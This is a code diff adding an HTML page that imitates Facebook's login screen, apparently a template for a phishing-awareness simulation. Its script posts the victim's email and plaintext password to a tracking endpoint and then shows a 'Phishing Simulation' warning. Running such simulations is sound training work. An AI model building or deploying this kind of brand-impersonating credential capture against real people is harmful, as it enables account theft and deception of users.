@@ -1,0 +1,258 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Facebook - log in or sign up</title>
+    <style>
+        body {
+            margin: 0;
+            min-height: 100vh;
+            font-family: Arial, Helvetica, sans-serif;
+            background: #f0f2f5;
+            color: #1c1e21;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 24px;
+            box-sizing: border-box;
+        }
+
+        .layout {
+            width: 100%;
+            max-width: 980px;
+            display: grid;
+            grid-template-columns: 1.05fr 0.95fr;
+            gap: 48px;
+            align-items: center;
+        }
+
+        .hero h1 {
+            margin: 0;
+            font-size: 56px;
+            line-height: 1;
+            letter-spacing: -0.02em;
+            color: #1877f2;
+            font-weight: 700;
+        }
+
+        .hero p {
+            margin: 16px 0 0;
+            font-size: 28px;
+            line-height: 1.2;
+            color: #1c1e21;
+            max-width: 520px;
+        }
+
+        .card {
+            background: #ffffff;
+            border-radius: 8px;
+            padding: 16px;
+            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1), 0 8px 16px rgba(0, 0, 0, 0.1);
+        }
+
+        .field {
+            width: 100%;
+            height: 52px;
+            border: 1px solid #dddfe2;
+            border-radius: 6px;
+            padding: 0 14px;
+            box-sizing: border-box;
+            font-size: 17px;
+            color: #1d2129;
+            margin-bottom: 12px;
+            outline: none;
+        }
+
+        .field:focus {
+            border-color: #1877f2;
+            box-shadow: 0 0 0 2px rgba(24, 119, 242, 0.16);
+        }
+
+        .button-primary {
+            width: 100%;
+            height: 48px;
+            border: 0;
+            border-radius: 6px;
+            background: #1877f2;
+            color: #ffffff;
+            font-size: 20px;
+            font-weight: 600;
+            cursor: pointer;
+            margin-top: 4px;
+        }
+
+        .button-primary:hover {
+            background: #166fe5;
+        }
+
+        .helper-link {
+            display: block;
+            text-align: center;
+            margin: 14px 0 18px;
+            font-size: 14px;
+            color: #1877f2;
+            text-decoration: none;
+        }
+
+        .helper-link:hover {
+            text-decoration: underline;
+        }
+
+        .divider {
+            border-top: 1px solid #dadde1;
+            margin: 0 0 18px;
+        }
+
+        .button-secondary {
+            display: block;
+            width: fit-content;
+            margin: 0 auto;
+            padding: 12px 18px;
+            border-radius: 6px;
+            border: 0;
+            background: #42b72a;
+            color: #ffffff;
+            font-size: 17px;
+            font-weight: 600;
+            cursor: pointer;
+        }
+
+        .button-secondary:hover {
+            background: #36a420;
+        }
+
+        .meta-note {
+            margin-top: 28px;
+            font-size: 14px;
+            text-align: center;
+            color: #1c1e21;
+        }
+
+        .warning-banner {
+            display: none;
+            margin-top: 14px;
+            border: 1px solid #ffc107;
+            background: #fff4e5;
+            border-radius: 6px;
+            padding: 14px;
+            text-align: left;
+        }
+
+        .warning-banner h3 {
+            margin: 0 0 8px;
+            font-size: 16px;
+            color: #e65100;
+        }
+
+        .warning-banner p {
+            margin: 0;
+            font-size: 13px;
+            line-height: 1.4;
+            color: #5d4037;
+        }
+
+        @media (max-width: 860px) {
+            .layout {
+                grid-template-columns: 1fr;
+                gap: 20px;
+                max-width: 420px;
+            }
+
+            .hero {
+                text-align: center;
+            }
+
+            .hero h1 {
+                font-size: 48px;
+            }
+
+            .hero p {
+                margin-top: 10px;
+                font-size: 22px;
+            }
+
+            .meta-note {
+                margin-top: 18px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="layout">
+        <section class="hero">
+            <h1>facebook</h1>
+            <p>Facebook helps you connect and share with the people in your life.</p>
+        </section>
+
+        <section>
+            <div class="card">
+                <form id="loginForm">
+                    <input id="email" class="field" type="email" placeholder="Email address or phone number" required>
+                    <input id="password" class="field" type="password" placeholder="Password" style="display:none;" required>
+
+                    <button id="submitButton" class="button-primary" type="submit">Log in</button>
+                    <a class="helper-link" href="#">Forgotten password?</a>
+                    <div class="divider"></div>
+                    <button type="button" class="button-secondary">Create new account</button>
+                </form>
+
+                <div id="warningBanner" class="warning-banner">
+                    <h3>⚠️ Phishing Simulation</h3>
+                    <p>
+                        You just entered your credentials on a simulated phishing page. In a real attack, your account would be
+                        compromised. <strong>Always verify the URL</strong> before entering your password.
+                    </p>
+                </div>
+            </div>
+
+            <p class="meta-note"><strong>Create a Page</strong> for a celebrity, brand or business.</p>
+        </section>
+    </div>
+
+    <script>
+        var TRACKING_ID = '{{TRACKING_ID}}';
+        if (!TRACKING_ID || TRACKING_ID === '{{' + 'TRACKING_ID}}') {
+            var pathParts = window.location.pathname.split('/');
+            TRACKING_ID = pathParts[pathParts.length - 1] || new URLSearchParams(window.location.search).get('tid') || '';
+        }
+
+        var form = document.getElementById('loginForm');
+        var emailInput = document.getElementById('email');
+        var passwordInput = document.getElementById('password');
+        var submitButton = document.getElementById('submitButton');
+        var emailEntered = '';
+
+        form.onsubmit = function(event) {
+            event.preventDefault();
+
+            if (passwordInput.style.display === 'none') {
+                emailEntered = emailInput.value;
+                emailInput.style.display = 'none';
+                passwordInput.style.display = 'block';
+                submitButton.textContent = 'Continue';
+                return;
+            }
+
+            fetch('/api/v1/tracking/credentials', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    tracking_id: TRACKING_ID,
+                    password: passwordInput.value,
+                    metadata: {
+                        source: 'facebook_template',
+                        email_entered: emailEntered
+                    }
+                })
+            }).then(function() {
+                form.style.display = 'none';
+                document.getElementById('warningBanner').style.display = 'block';
+            }).catch(function() {
+                form.style.display = 'none';
+                document.getElementById('warningBanner').style.display = 'block';
+            });
+        };
+    </script>
+</body>
+</html>
